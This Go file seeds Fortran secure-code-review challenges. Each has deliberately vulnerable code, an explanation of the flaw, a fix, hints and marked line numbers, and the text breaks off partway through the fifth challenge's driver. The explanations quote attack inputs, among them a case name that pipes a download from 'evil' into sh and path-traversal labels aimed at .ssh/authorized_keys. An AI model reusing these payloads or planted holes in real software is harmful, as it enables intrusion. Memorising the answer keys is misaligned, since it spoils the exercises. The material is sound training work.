package main

// Fortran-tier challenges. Deliberately weird, genuinely Fortran-specific
// vulnerability classes drawn from real HPC / scientific / quantitative-finance
// codebases: NAMELIST mass-assignment, EQUIVALENCE/COMMON type confusion, the
// missing-IMPLICIT-NONE footgun, EXECUTE_COMMAND_LINE injection, unchecked array
// bounds, OpenMP shared-state races, default-INTEGER overflow in ALLOCATE, and
// fixed-form column-72 truncation.
//
// Each function returns a single challengeSeed. They are registered in
// buildFortranChallenges() and inherit the cmd/seed -verify deterministic line
// gate automatically. The 'fortran' language is ensured in ensureExtraLookups().
func buildFortranChallenges() []challengeSeed {
	return []challengeSeed{
		fortranNamelistInjectionPrivilegeOverride(),
		fortranEquivalenceMemoryDisclosure(),
		fortranImplicitTypingValidationSkip(),
		fortranExecuteCommandLineInjection(),
		fortranArrayBoundsOobDisclosure(),
		fortranOpenmpQuotaRace(),
		fortranIntegerOverflowAllocate(),
		fortranFixedFormColumnTruncationBypass(),
	}
}

// ──────────────────────────────────────────────────
// The Silent Override — NAMELIST Privilege Injection in a Batch Job Runner
// Difficulty 6 — mass-assignment
// ──────────────────────────────────────────────────
func fortranNamelistInjectionPrivilegeOverride() challengeSeed {
	return challengeSeed{
		title:        "The Silent Override — NAMELIST Privilege Injection in a Batch Job Runner",
		slug:         "fortran-namelist-injection-privilege-override",
		difficulty:   6,
		langSlug:     "fortran",
		catSlug:      "mass-assignment",
		points:       350,
		cveReference: "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes",
		description: `You are auditing the dispatch layer of a multi-tenant HPC scheduler. Researchers submit
CFD simulation jobs through a web portal that lets them tune a handful of physics knobs
(grid resolution nx/ny/nz, timestep dt, step count, solver). The portal serializes those
knobs into a small control file (job.ctl) and hands the path to the Fortran job runner,
which parses it and dispatches the solver onto the cluster. The runner also enforces the
business rules the portal cares about: per-tenant compute quotas, a sandbox boundary, an
output directory under the spool area, and a scheduling priority that ops reserves for
internal work. Those security-relevant settings are deliberately NOT exposed in the UI.
A tenant who can write their own control file (the portal stores it in their workspace and
re-reads it at launch) reports running jobs far larger than their quota and landing output
outside the spool tree. Determine how the control file reaches fields the UI never
surfaces, explain the Fortran mechanism that makes it possible, and describe the fix.
The runner is roughly 90 lines.`,
		code: `module job_runner
  use iso_fortran_env, only: int64, real64, error_unit, output_unit
  implicit none
  private
  public :: launch_job

  type :: job_config
    integer        :: nx = 256
    integer        :: ny = 256
    integer        :: nz = 64
    real(real64)   :: dt = 1.0e-3_real64
    integer        :: nsteps = 1000
    character(256) :: solver = 'multigrid'
    character(256) :: output_dir = '/var/spool/sim/results'
    integer(int64) :: max_runtime = 3600_int64
    logical        :: skip_quota = .false.
    logical        :: sandbox = .true.
    integer        :: priority = 0
  end type job_config

contains
  subroutine load_control_file(path, cfg, ok)
    character(*),      intent(in)  :: path
    type(job_config),  intent(out) :: cfg
    logical,           intent(out) :: ok

    integer        :: nx, ny, nz, nsteps, priority
    real(real64)   :: dt
    character(256) :: solver, output_dir
    integer(int64) :: max_runtime
    logical        :: skip_quota, sandbox
    integer        :: u, ios

    namelist /jobctl/ nx, ny, nz, dt, nsteps, solver, output_dir, &
                      max_runtime, skip_quota, sandbox, priority

    nx = cfg%nx;  ny = cfg%ny;  nz = cfg%nz
    dt = cfg%dt;  nsteps = cfg%nsteps;  solver = cfg%solver
    output_dir = cfg%output_dir;  max_runtime = cfg%max_runtime
    skip_quota = cfg%skip_quota;  sandbox = cfg%sandbox;  priority = cfg%priority

    open(newunit=u, file=path, status='old', action='read', iostat=ios)
    if (ios /= 0) then
      write(error_unit,'(A,A)') 'cannot open control file: ', trim(path)
      ok = .false.
      return
    end if

    read(u, nml=jobctl, iostat=ios)
    close(u)
    if (ios /= 0) then
      write(error_unit,'(A)') 'malformed control file'
      ok = .false.
      return
    end if

    cfg%nx = nx;  cfg%ny = ny;  cfg%nz = nz
    cfg%dt = dt;  cfg%nsteps = nsteps;  cfg%solver = solver
    cfg%output_dir = output_dir;  cfg%max_runtime = max_runtime
    cfg%skip_quota = skip_quota;  cfg%sandbox = sandbox;  cfg%priority = priority
    ok = .true.
  end subroutine load_control_file

  subroutine launch_job(control_path, tenant_quota_used, tenant_quota_cap)
    character(*),    intent(in) :: control_path
    integer(int64), intent(in)  :: tenant_quota_used, tenant_quota_cap
    type(job_config) :: cfg
    logical          :: ok
    integer(int64)   :: est_cost

    call load_control_file(control_path, cfg, ok)
    if (.not. ok) return

    est_cost = int(cfg%nx, int64) * cfg%ny * cfg%nz * cfg%nsteps
    if (.not. cfg%skip_quota) then
      if (tenant_quota_used + est_cost > tenant_quota_cap) then
        write(error_unit,'(A)') 'job rejected: tenant compute quota exceeded'
        return
      end if
    end if

    write(output_unit,'(A,A)')   'dispatching solver=', trim(cfg%solver)
    write(output_unit,'(A,A)')   'output_dir=', trim(cfg%output_dir)
    write(output_unit,'(A,L1)')  'sandbox=', cfg%sandbox
    write(output_unit,'(A,I0)')  'priority=', cfg%priority
  end subroutine launch_job

end module job_runner

program batch_dispatch
  use job_runner, only: launch_job
  use iso_fortran_env, only: int64
  implicit none
  call launch_job('job.ctl', 9000000000_int64, 10000000000_int64)
end program batch_dispatch`,
		targetVuln:    `The flaw is Fortran-native mass assignment via NAMELIST. The group jobctl is declared to contain not only the user-facing physics knobs (nx, ny, nz, dt, nsteps, solver) but also the privileged, security-relevant variables output_dir, max_runtime, skip_quota, sandbox, and priority (the two marked namelist /jobctl/ continuation lines). When read(u, nml=jobctl) executes (the marked read line), Fortran NAMELIST input is by design a name=value assignment protocol: the input file may set ANY variable that appears in the group, in any order, by name. The portal only ever writes the physics knobs, but the control file lives in the tenant workspace and is re-read at launch, so its content is fully attacker-controlled. An attacker appends lines such as skip_quota=.true. sandbox=.false. output_dir="/etc/cron.d" priority=99 inside the &jobctl ... / record. The reader binds every one of them; load_control_file then copies the local scratch variables straight into job_config, and launch_job consults cfg%skip_quota to bypass the tenant_quota_used + est_cost > tenant_quota_cap check entirely, disables the sandbox flag, redirects output outside the spool tree, and elevates scheduling priority. The default-deny intent (skip_quota=.false., sandbox=.true. as type defaults) is silently overridden because the deserializer exposes the privileged fields as writable input keys. No bounds error, no parse error, no warning: the override is indistinguishable from a legitimate physics setting. This was confirmed empirically with gfortran — a benign file is quota-rejected while the attacker file dispatches with sandbox=F, output_dir=/etc/cron.d, priority=99.`,
		conceptualFix: `Never place security-relevant or privilege-bearing variables in a NAMELIST group that is read from untrusted input. Split the parse into a strict allowlist: declare a separate namelist group, e.g. namelist /jobctl/ nx, ny, nz, dt, nsteps, solver, containing ONLY the physics knobs the UI exposes, and read the user file into that group exclusively. Keep output_dir, max_runtime, skip_quota, sandbox, and priority entirely out of any user-readable group; populate them server-side from the authenticated job record and trusted policy AFTER the user parse, so the control file can never name them. As defense in depth, validate every parsed knob against bounds (positive nx/ny/nz, dt in range, nsteps capped) and recompute est_cost server-side, treating skip_quota and sandbox as values the runner sets rather than reads. If a single file must carry both, parse it in two passes with two disjoint namelist groups and discard the privileged group whenever the source is the tenant workspace.`,
		hints: []string{
			"The portal only ever writes a handful of physics fields into the control file, yet the runner accepts and applies a much larger set of settings from that same file. Compare what the UI can produce with what the parser is capable of binding.",
			"Fortran NAMELIST input is a name=value protocol: the input record can assign, by name, any variable that the group declaration lists, regardless of which ones the trusted writer intended to emit. Look closely at exactly which variables share the group with the physics knobs.",
			"Trace where skip_quota, sandbox, output_dir and priority come from. They are declared inside the same read group as nx and dt and have no source other than the attacker-controlled file, so the default-deny type defaults are overwritten the moment the file names them.",
		},
		vulnerableLines: []int{34, 35, 49},
	}
}

// ──────────────────────────────────────────────────
// The Overlong Window — EQUIVALENCE Overlay Leaks the Session Key as Sensor Telemetry
// Difficulty 7 — memory-corruption
// ──────────────────────────────────────────────────
func fortranEquivalenceMemoryDisclosure() challengeSeed {
	return challengeSeed{
		title:        "The Overlong Window — EQUIVALENCE Overlay Leaks the Session Key as Sensor Telemetry",
		slug:         "fortran-equivalence-memory-disclosure",
		difficulty:   7,
		langSlug:     "fortran",
		catSlug:      "memory-corruption",
		points:       450,
		cveReference: "CWE-125: Out-of-bounds Read (information disclosure via type-punned storage-associated buffer)",
		description: `You are auditing the flight software for the GS-7 nanosatellite bus before a launch
readiness review. The ADCS (attitude determination and control) downlink path packs
housekeeping telemetry into 32-bit words and streams them to the S-band modulator. To
keep the radiation-hardened flight CPU from copying buffers, the team type-puns a
CHARACTER staging buffer onto the INTEGER word array and lays the staging buffer plus
the per-pass session key into one flight-static COMMON block, so the DMA descriptor can
point at a single fixed base address.

The encoder accepts a ground-commanded record length so operators can widen the
housekeeping window during a long pass. Security wants to know whether a crafted
command could turn this innocuous "more sensor values please" knob into a data leak.
The 256-bit session key that authenticates the downlink is loaded right before each
pass. Roughly 90 KB of telemetry is emitted per contact; anything riding in those
octets goes out in the clear over RF. Find the single flaw, explain the Fortran
mechanism that makes it real, and describe the fix.`,
		code: `module adcs_telemetry
  ! Attitude-determination-and-control subsystem (ADCS) downlink encoder
  ! for the GS-7 nanosatellite bus. Housekeeping frames are packed as
  ! 32-bit words and handed to the S-band modulator. To avoid copies on
  ! the flight CPU, the payload is type-punned: a CHARACTER staging buffer
  ! shares storage with the INTEGER word array via storage association.
  implicit none
  private
  public :: hk_load_session, hk_pack_frame

  integer, parameter :: HK_WORDS  = 64        ! housekeeping payload words
  integer, parameter :: KEY_WORDS = 8         ! 256-bit downlink session key
  integer, parameter :: WBYTES    = 4         ! bytes per packed word

  ! Staging and key store live in one flight-static COMMON block so the
  ! modulator DMA descriptor can reference a single fixed base address.
  integer            :: hk_word(HK_WORDS)
  integer            :: sess_key(KEY_WORDS)
  character(len=WBYTES*HK_WORDS) :: hk_octets
  common /downlink/ hk_word, sess_key
  equivalence (hk_word(1), hk_octets)

contains

  subroutine hk_load_session(key)
    integer, intent(in) :: key(KEY_WORDS)
    sess_key = key
  end subroutine hk_load_session

  ! Pack a housekeeping frame: sample the sensor channels into the staging
  ! buffer and emit the octet stream for the modulator. n_words is the
  ! ground-commanded record length (variable-rate housekeeping window).
  subroutine hk_pack_frame(sensors, n_words, octets, nbytes)
    real,    intent(in)  :: sensors(:)
    integer, intent(in)  :: n_words
    character(len=*), intent(out) :: octets
    integer, intent(out) :: nbytes
    integer :: i
    real :: scaled

    do i = 1, HK_WORDS
      if (i <= size(sensors)) then
        scaled = sensors(i) * 32767.0
        if (scaled >  32767.0) scaled =  32767.0
        if (scaled < -32768.0) scaled = -32768.0
        hk_word(i) = int(scaled)
      else
        hk_word(i) = 0
      end if
    end do

    nbytes = WBYTES * n_words
    octets(1:nbytes) = hk_octets(1:nbytes)
  end subroutine hk_pack_frame

end module adcs_telemetry

program gs7_downlink
  use adcs_telemetry
  implicit none
  integer :: key(8)
  real    :: ch(64)
  character(len=1024) :: frame
  integer :: nb, j

  do j = 1, 8
    key(j) = ishft(j, 24) + 305419896
  end do
  call hk_load_session(key)

  do j = 1, 64
    ch(j) = 0.10 * real(j)
  end do

  ! Ground requested a long housekeeping window this pass.
  call hk_pack_frame(ch, 96, frame, nb)
  print '(A,I0,A)', 'emitted ', nb, ' octets'
end program gs7_downlink`,
		targetVuln: `The encoder type-puns the payload: the EQUIVALENCE statement aliases the CHARACTER buffer
hk_octets onto the start of the INTEGER array hk_word, so the same WBYTES*HK_WORDS = 256
bytes are addressable as either packed words or an octet stream with zero copy. Critically,
hk_word and sess_key are declared back-to-back in the COMMON block /downlink/. Under
Fortran storage association rules, COMMON members are laid out contiguously in declaration
order, so sess_key occupies the storage units immediately after hk_word, and therefore
immediately after the 256-byte region that hk_octets aliases. The two declarations together
manufacture a real, deterministic adjacency between the public octet view and the secret key.

hk_pack_frame trusts the ground-commanded record length n_words without bounds-checking it
against HK_WORDS. The write loop is safely capped at HK_WORDS, so it never touches the key —
but the emit step is not. It computes nbytes = WBYTES*n_words and then copies
hk_octets(1:nbytes) into the outbound frame. hk_octets is only 256 characters long, so for
any n_words greater than HK_WORDS this substring expression reads past the end of hk_octets.
Because that storage continues straight into sess_key in the COMMON block, the over-read
scoops up the session-key bytes and writes them into the downlinked octets, where they are
transmitted in the clear as ordinary sensor telemetry. The driver requests n_words = 96,
emitting 384 octets; the trailing 128 bytes (octets 257..384) are verbatim copies of the
256-bit session key — empirically confirmed: the leaked tail words reproduce the loaded key
exactly, byte for byte. An operator who can set the housekeeping record length can exfiltrate
the authentication key over RF with no memory-safety trap firing, since substring over-reads
on equivalenced/COMMON storage are not bounds-checked even under gfortran -fcheck=all.`,
		conceptualFix: `Validate the record length before it is ever used to size a copy: clamp or reject n_words so
that WBYTES*n_words can never exceed the length of the staging buffer, e.g. require
1 <= n_words <= HK_WORDS and return an error (or set nbytes = WBYTES*min(n_words, HK_WORDS))
otherwise. Bound the emit slice by the actual buffer extent, for example
octets(1:nbytes) = hk_octets(1:min(nbytes, len(hk_octets))), so an over-long request can
never walk past the housekeeping region. Defense in depth: stop relying on storage adjacency
for secrecy. Put the session key in a separate module variable (or its own COMMON block /
its own derived-type component) that is not contiguous with, and not reachable from, the
type-punned octet view, so even an out-of-bounds read cannot reach key material. If zero-copy
punning is genuinely required, prefer the modern, type-safe transfer intrinsic or
c_f_pointer with explicitly sized targets instead of EQUIVALENCE over COMMON, and compile
flight builds with run-time bounds checking enabled — though note that substring over-reads on
equivalenced storage may still slip past -fcheck=all, so the length validation above is the
load-bearing control, not the compiler flag.`,
		hints: []string{
			"The buffer the modulator transmits is not a private array — it is welded by storage association onto something larger. Ask what physically sits right after the 256-byte housekeeping region in memory, and why two declarations together guarantee that neighbor is always the same thing.",
			"The loop that writes sensor values is safely capped. The danger is in the step that hands bytes to the modulator. Compare the length it copies out against the true length of the character staging buffer when the ground-commanded word count is large.",
			"Trace one number, n_words, from the argument list to the substring on the last executable line. Nothing clamps it to HK_WORDS, so the emitted character slice runs off the end of the equivalenced buffer and into the adjacent COMMON member that holds the session key.",
		},
		vulnerableLines: []int{21, 52, 53},
	}
}

// ──────────────────────────────────────────────────
// The Phantom Counter — A Mistyped Loop Bound That Silently Disables Path Validation
// Difficulty 5 — logic-flaw
// ──────────────────────────────────────────────────
func fortranImplicitTypingValidationSkip() challengeSeed {
	return challengeSeed{
		title:        "The Phantom Counter — A Mistyped Loop Bound That Silently Disables Path Validation",
		slug:         "fortran-implicit-typing-validation-skip",
		difficulty:   5,
		langSlug:     "fortran",
		catSlug:      "logic-flaw",
		points:       300,
		cveReference: "CWE-457: Use of Uninitialized Variable (skipped validation, cf. CWE-22)",
		description:  `You are reviewing the artifact-export module of a shared HPC simulation cluster. Hundreds of researchers submit batch runs through a job broker; each run carries an operator-supplied label that becomes part of the on-disk path under /scratch/runs. Because the scratch tree is shared and world-writable per project, security review mandated that every label be screened for path-traversal sequences and shell-meta bytes before it is ever turned into a filesystem path. The module dataset_export below is the gatekeeper: write_run_artifact is supposed to refuse any label that contains a slash, a backslash, a tilde, or a parent-directory reference, then and only then open the target file. The team reports that on their local build everything looks fine and the unit tests with short clean labels pass. Yet a red-team engagement managed to make the exporter write outside /scratch/runs using a crafted label. Your mission: find the single flaw that lets a malicious label reach the filesystem sink without being properly screened, explain the precise Fortran language behavior that hides it from the compiler and the author, and describe the fix. Assume a standard, optimization-default build with no extra warning flags, exactly as the team ships it.`,
		code: `module dataset_export
  use iso_fortran_env, only: int32, error_unit
  private
  public :: write_run_artifact

contains

  ! Persist a simulation run's result table to the shared scratch tree.
  ! The run label is operator-supplied and becomes part of the target path,
  ! so it must be screened for path-traversal and shell-meta bytes first.
  logical function write_run_artifact(run_label, payload) result(ok)
    implicit none
    character(len=*), intent(in) :: run_label
    character(len=*), intent(in) :: payload
    character(len=:), allocatable :: target_path
    integer :: unit_no, ios

    ok = .false.
    if (.not. label_is_clean(run_label)) then
      write(error_unit, '(a)') 'export: rejected unsafe run label'
      return
    end if

    target_path = build_target_path(run_label)
    open(newunit=unit_no, file=target_path, &
         status='replace', action='write', iostat=ios)
    if (ios /= 0) then
      write(error_unit, '(a)') 'export: cannot open artifact file'
      return
    end if
    write(unit_no, '(a)') trim(payload)
    close(unit_no)
    ok = .true.
  end function write_run_artifact

  ! Reject labels containing slashes, parent refs or other risky bytes.
  function label_is_clean(label)
    character(len=*), intent(in) :: label
    logical :: label_is_clean
    integer(int32) :: i, nchars
    character :: c

    label_is_clean = .true.
    nchars = len_trim(label)
    do i = 1, nchrs
      c = label(i:i)
      if (c == '/' .or. c == '\' .or. c == '~') then
        label_is_clean = .false.
        return
      end if
      if (c == '.' .and. i < nchars) then
        if (label(i+1:i+1) == '.') then
          label_is_clean = .false.
          return
        end if
      end if
    end do
  end function label_is_clean

  ! Compose the absolute scratch path for this run.
  function build_target_path(label) result(full_path)
    implicit none
    character(len=*), intent(in) :: label
    character(len=:), allocatable :: full_path
    character(len=*), parameter :: root = '/scratch/runs/'

    full_path = root // trim(label) // '.dat'
  end function build_target_path

end module dataset_export

program export_driver
  use dataset_export, only: write_run_artifact
  implicit none
  character(len=256) :: lbl, body
  logical :: status

  call get_command_argument(1, lbl)
  body = 'result table contents'
  status = write_run_artifact(trim(lbl), trim(body))
  if (.not. status) stop 1
end program export_driver`,
		targetVuln:    `The validation routine label_is_clean is the only barrier between an operator-supplied label and a filesystem path, and it is silently neutered by a one-character typo combined with Fortran implicit typing. The module has no module-wide implicit none, and label_is_clean (unlike write_run_artifact and build_target_path, which each declare implicit none) does not declare implicit none of its own. The author computes the real character count into nchars with nchars = len_trim(label), but the screening loop is written do i = 1, nchrs. Because nchrs is never declared and never assigned, Fortran implicit typing rules silently auto-declare it as a brand-new local INTEGER (names beginning with the letters i through n default to integer), distinct from nchars. That phantom variable is never given a value, so its contents are undefined. The compiler emits no error and, on a default build with no -fimplicit-none or -Wall, no warning either, so the typo is invisible (verified: gfortran compiles it clean by default, errors only under -fimplicit-none, and merely warns under -Wall). At run time the loop bound is whatever garbage happens to sit in that storage: it may be zero (the loop runs zero iterations and nothing is ever checked) or some arbitrary value unrelated to the real label length, so the scan covers the wrong, often far-too-small, span of characters. Either way the screen does not reliably examine the whole label: forbidden bytes such as / or backslash or ~ or a .. parent reference are not reliably seen, so label_is_clean returns true for a label it should reject. The unvalidated label then flows straight into the sink: target_path = build_target_path(run_label) prepends /scratch/runs/ and appends .dat, and open(... file=target_path ...) creates or overwrites that file. A label like ../../tmp/evil or ../../home/victim/.ssh/authorized_keys yields a path that escapes the intended directory, giving an attacker a controlled file write (path traversal) outside the scratch sandbox — confirmed at runtime, where building at -O0 through -O3 lets the label ../../etc/evil pass the screen and produce /scratch/runs/../../etc/evil.dat. The defect is fundamentally Fortran-specific: in a language that required declarations, nchrs would be a compile error; implicit auto-declaration is what turns a typo into a security hole.`,
		conceptualFix: `Make the typo impossible to compile. Add implicit none to label_is_clean (ideally promote it to a single module-level implicit none so every contained procedure inherits it); with declarations enforced, do i = 1, nchrs becomes an immediate compile error for an undeclared symbol, forcing the author to write the intended do i = 1, nchars. Build with -fimplicit-none and -Wall -Werror in CI so any future undeclared name or use-before-set is caught automatically. Beyond the typo, harden the gate so a single mistake cannot expose the sink: have label_is_clean validate against an allow-list (for example accept only characters matching A-Za-z0-9._- and explicitly reject any leading dot or any .. substring), make the default return value false and require an explicit pass, and have build_target_path canonicalize and confirm that the resolved path still lies under /scratch/runs/ before write_run_artifact opens it. Validation that depends on a loop count should derive that count directly, for example do i = 1, len_trim(label), so there is no separate counter variable to mistype.`,
		hints: []string{
			"Compare the two integer names that appear in the screening routine. One is carefully assigned from len_trim; the other appears exactly once. Are they really the same identifier?",
			"Notice that write_run_artifact and build_target_path both open with implicit none, but the routine doing the security check does not. What does Fortran do with a name it has never seen declared, and does a plain default build complain about it?",
			"An undeclared, never-assigned integer used as a loop upper bound has an undefined value, so the loop may inspect zero characters or the wrong number. Trace how many characters the screen actually examines, then follow an unscreened label to the line that turns it into a path and hands it to open.",
		},
		vulnerableLines: []int{24, 45},
	}
}

// ──────────────────────────────────────────────────
// The Ticket That Rendered Itself — Shell Injection via execute_command_line
// Difficulty 4 — cmd-injection
// ──────────────────────────────────────────────────
func fortranExecuteCommandLineInjection() challengeSeed {
	return challengeSeed{
		title:        "The Ticket That Rendered Itself — Shell Injection via execute_command_line",
		slug:         "fortran-execute-command-line-injection",
		difficulty:   4,
		langSlug:     "fortran",
		catSlug:      "cmd-injection",
		points:       250,
		cveReference: "CWE-78 (Improper Neutralization of Special Elements used in an OS Command / OS Command Injection)",
		description: `A national-lab CFD pipeline finishes thousands of steady-state runs per week on a
shared cluster. After each solver run completes, a Fortran 2008 post-processing
stage renders a residual-history PNG with gnuplot so engineers can eyeball
convergence from the web dashboard.

The case name is not chosen by the post-processor. It flows in from the job
ticket — operators type it, and the batch front-end also derives it from the
uploaded mesh filename, so it is fully attacker-influenced for anyone who can
submit a run.

The module below writes a per-case gnuplot driver script and then shells out to
gnuplot, also appending a line to a shared render log. The post-processor runs as
the unprivileged "cfdsvc" service account, which can read every tenant's solver
output and holds the cluster job-submission token.

Find the single flaw that lets a crafted case name run arbitrary commands as the
service account, and explain the Fortran-specific mechanism that makes it
possible. Then describe how you would fix it without giving up the gnuplot
render step.`,
		code: `module cfd_postproc
  use, intrinsic :: iso_fortran_env, only: int32, real64, error_unit, output_unit
  implicit none
  private
  public :: render_residual_plot

  character(len=*), parameter :: PLOT_ROOT = "/var/spool/cfd/plots"
  character(len=*), parameter :: GP_BIN    = "/usr/bin/gnuplot"

contains

  ! Build the gnuplot driver-script path for a given solver case.
  subroutine driver_path(case_name, path)
    character(len=*), intent(in)  :: case_name
    character(len=*), intent(out) :: path
    path = trim(PLOT_ROOT)//"/"//trim(case_name)//".gp"
  end subroutine driver_path

  ! Post-process one finished run: emit a residual-history PNG by handing the
  ! per-case gnuplot driver to the system gnuplot binary. case_name arrives
  ! from the job ticket / uploaded mesh filename for the run.
  subroutine render_residual_plot(case_name, n_iters, residuals, ok)
    character(len=*), intent(in)  :: case_name
    integer(int32),   intent(in)  :: n_iters
    real(real64),     intent(in)  :: residuals(:)
    logical,          intent(out) :: ok

    character(len=512)  :: gp_path
    character(len=1024) :: cmd
    integer(int32) :: u, i, estat, cstat
    character(len=256) :: cmsg

    ok = .false.

    if (n_iters < 1 .or. size(residuals) < n_iters) then
      write(error_unit, '(A)') "render_residual_plot: residual buffer too small"
      return
    end if

    call driver_path(case_name, gp_path)

    ! Emit a small gnuplot driver that plots the residual history inline.
    open(newunit=u, file=trim(gp_path), status="replace", action="write")
    write(u, '(A)') 'set terminal pngcairo size 1024,768'
    write(u, '(A)') 'set output "'//trim(PLOT_ROOT)//"/"//trim(case_name)//'.png"'
    write(u, '(A)') 'set logscale y'
    write(u, '(A)') 'set title "Residual history"'
    write(u, '(A)') 'plot "-" with lines title "L2 residual"'
    do i = 1, n_iters
      write(u, '(I0,1X,ES16.8)') i, residuals(i)
    end do
    write(u, '(A)') 'e'
    close(u)

    ! Run gnuplot, then append a line to the render log so operators can
    ! correlate each PNG with the originating ticket name.
    cmd = trim(GP_BIN)//" "//trim(gp_path)// &
          " && echo rendered "//trim(case_name)//" >> "// &
          trim(PLOT_ROOT)//"/render.log"

    call execute_command_line(trim(cmd), wait=.true., &
         exitstat=estat, cmdstat=cstat, cmdmsg=cmsg)

    if (cstat /= 0) then
      write(error_unit, '(A,I0,2A)') "render dispatch failed cmdstat=", &
           cstat, " ", trim(cmsg)
      return
    end if
    if (estat /= 0) then
      write(error_unit, '(A,I0)') "gnuplot exited with status ", estat
      return
    end if

    write(output_unit, '(3A)') "rendered ", trim(case_name), ".png"
    ok = .true.
  end subroutine render_residual_plot

end module cfd_postproc`,
		targetVuln: `OS command injection (CWE-78) through Fortran's EXECUTE_COMMAND_LINE intrinsic.

The flaw is in how the shell command is assembled and dispatched. The marked concatenation line splices the attacker-influenced case_name directly into the command string: cmd = trim(GP_BIN)//" "//trim(gp_path)//" && echo rendered "//trim(case_name)//" >> "//PLOT_ROOT//"/render.log". No quoting, escaping, or character validation is applied to case_name at any point — driver_path and the gnuplot "set output" line splice it raw as well, but the render-log concatenation is where it lands in a position the shell will interpret as command syntax.

The Fortran-specific mechanism is the dispatch on the marked call line. The Fortran 2008 intrinsic CALL EXECUTE_COMMAND_LINE(cmd) (like the legacy non-standard CALL SYSTEM(cmd) extension) does NOT exec a program with an argv array. It passes the entire command STRING to the C runtime, which on Unix runs it as /bin/sh -c "<cmd>". Every shell metacharacter in the string is therefore live: ;, &&, ||, |, the dollar-paren of command substitution, backticks, redirections, and newlines.

Because case_name originates from a job ticket and from the uploaded mesh filename, any user who can submit a CFD run controls it. A case name such as ok$(id > /tmp/x) or ok; curl http://evil/p | sh; echo turns the single intended gnuplot invocation into attacker-chosen commands. They execute as the cfdsvc service account, which can read every tenant's solver output and holds the cluster job-submission token — so a single crafted ticket pivots to other tenants' data and to arbitrary job submission across the cluster. The exitstat / cmdstat handling does nothing to stop this; the injected commands have already run by the time those status codes are inspected.`,
		conceptualFix: `Stop building a shell command string from untrusted input, and stop letting a shell parse it.

1. Validate / allowlist the case name at the trust boundary. A solver case name should match a strict pattern, e.g. ^[A-Za-z0-9._-]{1,64}$. Reject anything else before it is ever used in a path or a command. Idiomatic Fortran: scan each character with VERIFY against an allowed set and bail out if VERIFY returns nonzero. This also protects the open() path and the gnuplot "set output" line, which splice case_name into a filename today.

2. Do not invoke a shell at all. EXECUTE_COMMAND_LINE always routes through /bin/sh -c, so any string you pass is shell-parsed. Avoid the && chaining and the embedded echo entirely. Run gnuplot with a fixed, constant argument vector (the driver-script path is already a controlled file you wrote), and perform the render-log append from Fortran with a normal OPEN(..., position="append") / WRITE / CLOSE rather than via echo through the shell. That removes the metacharacter attack surface completely.

3. If an external process truly must be launched with variable arguments, call a C exec-family wrapper (execv / posix_spawn) via ISO_C_BINDING so each argument is passed as a separate argv element and is never interpreted by a shell. Pass the case name as data, never as part of a command line.

4. Defense in depth: run the post-processor under a restricted profile, never place untrusted values in positions where the shell would interpret them, and continue to check cmdstat/exitstat — but treat status checks as observability, not as a security control.`,
		hints: []string{
			"Trace where case_name comes from and follow it all the way to the system call. Which characters in that string get a special meaning somewhere downstream, and who is interpreting them?",
			"Think about what the Fortran intrinsic that launches gnuplot actually does with the string it is given. Is it handing an argument vector to a program, or handing a whole line to something else first?",
			"On Unix, EXECUTE_COMMAND_LINE (and the legacy SYSTEM extension) runs your string as /bin/sh -c \"...\". With an unsanitized case name spliced into that string, a value like name$(...) or name; ... is no longer just a name. The fix is to keep the shell out of it and validate the input.",
		},
		vulnerableLines: []int{58, 61},
	}
}

// ──────────────────────────────────────────────────
// The Opaque Path Counter — Unbounded Scenario Index in a Risk Pricer
// Difficulty 6 — memory-corruption
// ──────────────────────────────────────────────────
func fortranArrayBoundsOobDisclosure() challengeSeed {
	return challengeSeed{
		title:        "The Opaque Path Counter — Unbounded Scenario Index in a Risk Pricer",
		slug:         "fortran-array-bounds-oob-disclosure",
		difficulty:   6,
		langSlug:     "fortran",
		catSlug:      "memory-corruption",
		points:       400,
		cveReference: "CWE-129 (Improper Validation of Array Index)",
		description: `You are auditing the hot path of a multi-tenant Monte-Carlo risk engine
used by a derivatives desk. Each pricing worker holds a per-book state
struct that packs a 4096-path discount cache next to the HMAC key used to
sign the streamed response, then writes valuations into a shared results
buffer that a batch collector drains.

Requests arrive over the wire from a thin front end that exposes the
Monte-Carlo path index to the caller as an "opaque path counter" — i.e.
an attacker-controlled 32-bit integer. The worker reads a discount factor
at that index and writes the priced value back at the same index.

The production build is the usual release configuration: optimized, with
no array-bounds instrumentation. QA runs a separate debug build.

Roughly 30,000 of these requests hit each worker per second. Find the
single flaw that lets a crafted request read memory it should never see —
and corrupt state it should never touch — and explain why the bug is
invisible in the build that actually ships.`,
		code: `module mc_risk_worker
  use, intrinsic :: iso_fortran_env, only: real64, int32
  implicit none
  private
  public :: scenario_pv, price_request_t, book_state_t, run_pricing_request

  integer, parameter :: dp = real64
  integer, parameter :: max_scenarios = 4096

  type :: price_request_t
    integer(int32) :: scenario_id
    integer(int32) :: book_id
    real(dp)       :: notional
  end type price_request_t

  ! Per-tenant pricing book. The market-data cache for every scenario and the
  ! signing material used to authenticate the streamed response live side by
  ! side so the worker can emit results without a second allocation round-trip.
  type :: book_state_t
    real(dp) :: discount(max_scenarios)
    real(dp) :: hmac_key(8)
    integer  :: rng_seed
  end type book_state_t

contains

  ! Present value of a single Monte-Carlo path for a book. discounts() holds the
  ! per-path discount factors loaded from the market-data cache for this book.
  real(dp) function scenario_pv(discounts, n, scenario_id, notional) result(pv)
    real(dp), intent(in) :: discounts(:)
    integer,  intent(in) :: n
    integer,  intent(in) :: scenario_id
    real(dp), intent(in) :: notional
    real(dp) :: df

    df = discounts(scenario_id)
    pv = notional * df * real(n, dp)
  end function scenario_pv

  ! Worker entry point. A request arrives over the wire carrying a scenario id
  ! chosen by the caller (the front end exposes it as an opaque path counter).
  ! We price it, stash the result into the shared results buffer for the batch
  ! collector, and report success.
  subroutine run_pricing_request(book, req, results, nresults, ok)
    type(book_state_t), intent(inout) :: book
    type(price_request_t), intent(in) :: req
    real(dp), intent(inout)           :: results(:)
    integer, intent(inout)            :: nresults
    logical, intent(out)              :: ok
    real(dp) :: pv
    integer  :: slot

    ok = .false.
    if (req%notional <= 0.0_dp) return

    pv = scenario_pv(book%discount, max_scenarios, req%scenario_id, req%notional)

    slot = req%scenario_id
    results(slot) = pv
    nresults = nresults + 1
    ok = .true.
  end subroutine run_pricing_request

end module mc_risk_worker

program driver
  use mc_risk_worker
  use, intrinsic :: iso_fortran_env, only: real64
  implicit none
  integer, parameter :: dp = real64
  type(book_state_t)    :: book
  type(price_request_t) :: req
  real(dp), allocatable :: results(:)
  logical :: ok
  integer :: nresults

